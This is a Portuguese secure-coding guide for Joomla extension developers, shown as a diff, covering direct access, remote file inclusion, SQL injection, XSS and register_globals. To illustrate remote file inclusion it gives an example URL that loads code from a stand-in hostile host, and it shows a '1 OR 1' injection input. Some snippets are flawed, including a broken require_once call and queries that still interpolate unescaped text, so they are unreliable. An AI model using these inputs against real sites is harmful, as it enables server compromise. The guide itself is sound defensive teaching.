@@ -1,0 +1,136 @@
+Medidas de Segurança na programação Joomla
+Rachel Pereira
+
+Antes de começar a programar componentes, módulos ou mambots/plugins para o Joomla, é bom conhecer algumas precauções que devem ser tomadas para evitar que seu site se torne um alvo fácil para crackers que adoram explorar falhas de segurança.
+
+Evitar acesso direto
+
+O primeiro cuidado que você precisa ter é evitar o acesso direto de componentes, módulos, mambots/plugins, etc. Todo mundo está careca de saber que os componentes do Joomla ficam no diretório /components, os módulos ficam no diretório /modules e os mambots do Joomla 1.0.x ficam no diretório /mambots e no Joomla 1.5 em diante no diretório /plugins. Além disto, os subdiretórios são identificados como com_seuComponente, mod_seuMódulo e assim por diante. Devido ao padrão utilizado, é muito fácil chamar diretamente uma extensão. Basta colocar o seguinte na barra de endereços do navegador:
+http://www.seusite.com.br/index.php?option=com_seucomponente
+
+Com esta chamada, se o seu componente estiver programado para executar algum código, podes crer... o código será executado e pode entregar o ouro para os bandidos. Como fazer para evitar o acesso direto? Muito simples. Use o Joomla para fazer o bloqueio.
+
+Quando o Joomla é inicializado, as variáveis _VALID_MOS (nas versões 1.0.x) ou _JEXEC (na versão 1.5) também são inicializadas e só serão reconhecidas se o próprio Joomla fizer a chamada, ou seja, nas chamadas diretas elas são ignoradas. Bingo!!!
+
+Para se proteger das chamadas diretas basta incluir a seguinte linha no início de cada script PHP do Joomla 1.0.x:
+
+defined( '_VALID_MOS' ) or die( 'Acesso bloqueado' );
+
+Se você quiser, pode trocar die( 'Acesso bloqueado' ) por die( 'Vá lamber sabão!' )
+
+Na versão 1.5 use:
+
+defined( '_JEXEC' ) or die( 'Área de acesso restrito' );
+
+Imagine a seguinte linha de código no seu arquivo:
+
+include( $mosConfig_absolute_path . '/components/com_componente/classe.componente.php' );
+
+Agora imagine o cracker tentando ganhar acesso:
+
+http://www.seusite.com.br/components/com_componente/componente.php?
+mosConfig_absolute_path=http://www.sitebichado.com/caca.gif
+Para mal dos pecados, se o caca.gif não for um arquivo de imagem, mas sim um código malicioso, e se o register_globals do PHP estiver habilitado (register_globals ON), o código caca.gif será incorporado e executado no seu servidor. Alerta vermelho! Pode ser qualquer tranqueira perniciosa!
+
+Para evitar este tipo de surpresa, tome um cuidado especial com include, require, include_once, require_once e fopen. Faça estas chamadas apenas através de variáveis:
+
+define( 'SEUBASEPATH', dirname(__FILE__) );
+require_once( SEUBASEPATH, '/arquivo_para_incluir.php' );
+Evitar injeções SQL
+
+Atacantes podem modificar certas queries inseguras. Neste caso, seu script é executado de forma anômala e pode alterar dados da sua base de dados ou entregar informações preciosas para o atacante. Tome como exemplo a seguinte query:
+
+$valor = $_GET['valor'];
+$database->setQuery( "SELECT * FROM #__tabela WHERE id = $valor" );
+
+Aproveitando-se desta falha, um atacante pode fazer uma chamada usando "1 OR 1" e a query ficaria assim:
+
+SELECT * FROM #__tabela WHERE id = 1 OR 1
+
+Como é uma query válida, todos os registros da tabela serão listados! Para evitar este tipo de malandragem, aliás uma das mais manjadas para fazer injeção de SQL, faça o seguinte:
+
+$string = $database->getEscaped( $string ); // para Joomla 1.0.x
+$db->getEscaped( $string ); // para Joomla 1.5
+
+Apesar destes cuidados, os números inteiros ainda podem ser um problema. Por isto, antes de usar qualquer valor inteiro numa query, dê um trato neles:
+
+$valor = intval( $valor );
+
+Confira também todos os valores fornecidos antes de usá-los. Para o Joomla 1.0.x faça:
+
+$valor = mosGetParam( $_POST, 'valor' );
+ou
+$valor = mosGetParam( $_POST, 'valor', 'default' );
+
+O correspondente no Joomla 1.5 é:
+
+$valor = JRequest::getVar( 'valor', '', 'post', string );
+ou
+$valor = JRequest::getVar( 'valor', 'default', 'post', string );
+
+A função JRequest::getVar retorna valores sem a barra de escape \ em caracteres especiais, como por exemplo \" ou \' (unescaped). Para poder usá-los em queries use:
+
+$db->getEscaped( $string );
+Evitar XSS
+
+XSS vem de Cross Site Scripting e significa executar scripts (por exemplo um Javascript) no browser do visitante. Cuidado para não usar echo em qualquer input de usuário que não tenha sido validado. Uma coisa do tipo:
+
+echo $_REQUEST[ 'valor' ];
+
+é muito perigosa. Use mosGetParam ou JRequest::getVar para obter o valor porque estas funções já eliminam a maioria das tranqueiras que eventualmente podem estar sendo enviadas. Para garantir mais um pouco, antes de colocar alguma coisa na página, faça mais uma limpeza com:
+
+$valor = htmlspecialchars( $valor );
+echo $valor;
+Evitar register_globals
+
+O register_globals é uma configuração do PHP. Quando register_globals está habilitado, o PHP exporta todos os $_GET, $_POST, $_COOKIE e algumas outras variáveis para o escopo global. Isto facilita muito a vida dos programadores, mas infelizmente também facilita a vida dos crackers. Se quisermos um site que tenha um mínimo de segurança, a primeira coisa a fazer é desligar o register_globals e aprender a se virar sem ele.
+
+* Ative as mesnagens de erro do PHP para que ele mostre as variáveis que estão sendo usadas sem terem sido inicializadas.
+* Desabilite o register_globals no arquivo php.ini
+* Desabilite RG_EMULATION (ponha valor 0) em globals.php. Este arquivo fica no diretório raiz do Joomla.
+
+Se você não tiver acesso às configurações do PHP e o register_globals estiver ativado, entre em contato com seu serviço de hospedagem e peça para que o desabilitem. Se não for atendido, é melhor trocar de hospedagem do que expor seu site a riscos desnecessários.
+
+Não use:
+
+echo $GLOBALS[ 'nomeVariável' ];
+
+Troque por:
+
+global $nomeVariável;
+echo $nomeVariável;
+Checar privilégios de acesso
+
+Controle com cuidado quem é quem no pedaço antes de autorizar uma query. O Joomla classifica os usuários em:
+
+gid = 0 Não logado
+gid = 1 Usuário registrado
+gid = 2 Usuário especial
+
+Para evitar que usuários sem os devidos direitos vejam determinadas informações, inclua uma pesquisa de privilégios nas queries. Por exemplo, no Joomla 1.0.x:
+
+SELECT * FROM #__contact_details AS c
+LEFT JOIN #__categories AS cat ON cat.id = c.catid
+WHERE ( c.name LIKE '%$text%' )
+AND c.published = 1
+AND cat.published = 1
+AND c.access <= $my->gid
+AND cat.access <= $my->gid
+
+No Joomla 1.5 a mesma query seria:
+
+// Inicializar variáveis como exemplo de como obter o usuário atual
+$app = & $this->getApplication();
+$user = & $app->getUser();
+
+SELECT * FROM #__contact_details AS c
+LEFT JOIN #__categories AS cat ON cat.id = c.catid
+WHERE ( c.name LIKE '%$text%' )
+AND c.published = 1
+AND cat.published = 1
+AND c.access <= $user->get('gid')
+AND cat.access <= $user->get('gid')
+
+Fonte: Numa Boa - site atualmente fora do ar
+http://www.joomlarj.com.br/site/index.php?option=com_content&view=article&id=52:medidas-de-seguranca-na-programacao-joomla&catid=15:seguranca-no-joomla&Itemid=15
+
